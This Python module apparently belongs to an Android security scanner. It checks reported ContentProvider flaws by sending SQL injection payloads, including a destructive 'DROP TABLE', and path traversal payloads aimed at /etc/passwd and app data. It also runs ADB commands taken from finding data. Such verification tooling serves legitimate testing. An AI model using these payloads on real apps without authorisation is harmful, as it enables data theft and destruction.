"""ContentProvider vulnerability verifier."""

import time
import logging
import re
from typing import Dict, Any, List, Optional

from .base import BaseVerifier, VerificationResult, VerificationStatus

logger = logging.getLogger(__name__)


class ProviderVerifier(BaseVerifier):
    """Verify ContentProvider vulnerabilities including SQLi and path traversal."""

    CATEGORY = "provider"

    # SQL injection payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1",
        "') OR ('1'='1",
        "1 OR 1=1",
        "' OR ''='",
        "'; WAITFOR DELAY '0:0:5'--",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "../../../data/data/",
        "../shared_prefs/",
        "../databases/",
        "%2e%2e%2f%2e%2e%2f",
        "..%252f..%252f",
        "file:///etc/passwd",
    ]

    def can_verify(self, finding: Dict[str, Any]) -> bool:
        """Check if this is a ContentProvider-related finding."""
        fid = finding.get('fid', '').lower()
        category = finding.get('category', '').lower()
        title = finding.get('title', '').lower()

        return (
            'provider' in fid or
            'provider' in category or
            'contentprovider' in title.replace(' ', '') or
            'content://' in str(finding.get('extra', {})) or
            'sqli' in fid or
            'sql-injection' in fid or
            'path-traversal' in fid
        )

    def verify(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify ContentProvider vulnerability."""
        finding_id = self._extract_finding_id(finding)
        start_time = time.time()

        fid = finding.get('fid', '').lower()

        try:
            if 'sqli' in fid or 'sql' in fid or 'injection' in fid:
                result = self._verify_sqli(finding)
            elif 'traversal' in fid or 'path' in fid:
                result = self._verify_path_traversal(finding)
            elif 'exported' in fid:
                result = self._verify_exported_provider(finding)
            else:
                result = self._verify_generic_provider(finding)

            result.duration = time.time() - start_time
            return result

        except Exception as e:
            logger.error(f"Provider verification failed: {e}")
            return self._create_result(
                finding_id,
                VerificationStatus.ERROR,
                error_message=str(e),
                duration=time.time() - start_time
            )

    def _verify_sqli(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify SQL injection in ContentProvider."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        extra = finding.get('extra', {})
        uri = extra.get('uri') or extra.get('content_uri')

        if not uri:
            # Try to construct URI from package and authority
            package = self._get_package(finding)
            authority = extra.get('authority')
            if authority:
                uri = f"content://{authority}/"

        if not uri:
            result.notes = "Could not determine content URI"
            return result

        # Test each SQLi payload
        for payload in self.SQLI_PAYLOADS:
            # Try in WHERE clause
            test_uri = uri
            if not test_uri.endswith('/'):
                test_uri += '/'

            success, output = self._device.query_content_provider(
                test_uri,
                selection=payload
            )

            if success:
                output_lower = output.lower()

                # Check for SQLi indicators
                sqli_indicators = [
                    'syntax error',
                    'sql',
                    'sqlite',
                    'unrecognized token',
                    'near "or"',
                    'near "union"',
                    'no such column',
                    'ambiguous column',
                ]

                error_found = any(ind in output_lower for ind in sqli_indicators)
                data_leaked = len(output) > 100  # Significant response

                if error_found:
                    result.status = VerificationStatus.VERIFIED
                    result.confidence = 0.9
                    result.payload_used = payload
                    result.add_evidence(
                        "response",
                        f"SQL error returned with payload: {payload}",
                        data=output[:500],
                        severity="critical"
                    )
                    return result

                if data_leaked and "row" in output_lower:
                    result.status = VerificationStatus.LIKELY
                    result.confidence = 0.7
                    result.payload_used = payload
                    result.add_evidence(
                        "response",
                        "Payload returned data rows",
                        data=output[:500],
                        severity="high"
                    )

        # Try projection-based injection
        for payload in ["* FROM sqlite_master--", "1,sql FROM sqlite_master--"]:
            success, output = self._device.query_content_provider(
                uri,
                projection=[payload]
            )

            if success and 'create table' in output.lower():
                result.status = VerificationStatus.VERIFIED
                result.confidence = 0.95
                result.payload_used = f"projection: {payload}"
                result.add_evidence(
                    "response",
                    "Database schema leaked via projection injection",
                    data=output[:500],
                    severity="critical"
                )
                return result

        return result

    def _verify_path_traversal(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify path traversal in ContentProvider."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        extra = finding.get('extra', {})
        uri = extra.get('uri') or extra.get('content_uri')
        package = self._get_package(finding)

        if not uri:
            authority = extra.get('authority')
            if authority:
                uri = f"content://{authority}/"

        if not uri:
            result.notes = "Could not determine content URI"
            return result

        # Test each path traversal payload
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            test_uri = uri.rstrip('/') + '/' + payload

            # Query the provider
            success, output = self._device.query_content_provider(test_uri)

            if success:
                output_lower = output.lower()

                # Check for file content indicators
                traversal_indicators = [
                    'root:',           # /etc/passwd
                    '#!/',             # Script files
                    'permission denied',  # Access attempt
                    '<?xml',           # Config files
                    '<manifest',       # AndroidManifest
                    'sqlite',          # Database files
                    'shared_prefs',
                ]

                if any(ind in output_lower for ind in traversal_indicators):
                    result.status = VerificationStatus.VERIFIED
                    result.confidence = 0.9
                    result.payload_used = payload
                    result.add_evidence(
                        "response",
                        f"Path traversal successful with: {payload}",
                        data=output[:500],
                        severity="critical"
                    )
                    return result

            # Also try via openFile if provider supports it
            cmd = f"content read --uri {test_uri}"
            success, output = self._device.execute_shell(cmd)

            if success and len(output) > 10:
                if 'exception' not in output.lower() and 'error' not in output.lower():
                    result.status = VerificationStatus.LIKELY
                    result.confidence = 0.6
                    result.payload_used = payload
                    result.add_evidence(
                        "response",
                        f"File read attempted with: {payload}",
                        data=output[:300],
                        severity="high"
                    )

        return result

    def _verify_exported_provider(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify exported ContentProvider can be accessed."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        extra = finding.get('extra', {})
        authority = extra.get('authority')
        package = self._get_package(finding)

        if not authority and package:
            # Try common authority patterns
            authority = package

        if not authority:
            result.notes = "Could not determine provider authority"
            return result

        # Try to query the provider
        uri = f"content://{authority}/"
        success, output = self._device.query_content_provider(uri)

        if success:
            if 'permission denial' in output.lower():
                result.status = VerificationStatus.NOT_VULNERABLE
                result.add_evidence(
                    "response",
                    "Provider requires permission",
                    severity="info"
                )
            elif 'exception' in output.lower() or 'error' in output.lower():
                result.status = VerificationStatus.POSSIBLE
                result.confidence = 0.3
                result.add_evidence(
                    "response",
                    "Provider accessible but returned error",
                    data=output[:300],
                    severity="low"
                )
            else:
                result.status = VerificationStatus.VERIFIED
                result.confidence = 0.8
                result.add_evidence(
                    "response",
                    "Provider accessible without permission",
                    data=output[:500],
                    severity="high"
                )

        # Check what data can be extracted
        common_paths = ['', 'data', 'items', 'users', 'settings', 'files']
        for path in common_paths:
            test_uri = f"content://{authority}/{path}"
            success, output = self._device.query_content_provider(test_uri)

            if success and len(output) > 50 and 'row' in output.lower():
                result.status = VerificationStatus.VERIFIED
                result.confidence = 0.85
                result.add_evidence(
                    "response",
                    f"Data exposed at: {test_uri}",
                    data=output[:300],
                    severity="high"
                )
                break

        return result

    def _verify_generic_provider(self, finding: Dict[str, Any]) -> VerificationResult:
        """Generic ContentProvider verification."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        # Execute any ADB commands from the finding
        adb_commands = finding.get('adb_commands', [])
        for cmd in adb_commands:
            if 'content' in cmd.lower():
                success, output = self.execute_adb_command(cmd)
                if success and output.strip():
                    result.status = VerificationStatus.POSSIBLE
                    result.confidence = 0.4
                    result.add_evidence(
                        "command",
                        f"Provider query returned data",
                        data=output[:500],
                        severity="medium"
                    )
                    break

        # Try SQLi and path traversal as fallback
        sqli_result = self._verify_sqli(finding)
        if sqli_result.status in [VerificationStatus.VERIFIED, VerificationStatus.LIKELY]:
            return sqli_result

        traversal_result = self._verify_path_traversal(finding)
        if traversal_result.status in [VerificationStatus.VERIFIED, VerificationStatus.LIKELY]:
            return traversal_result

        return result
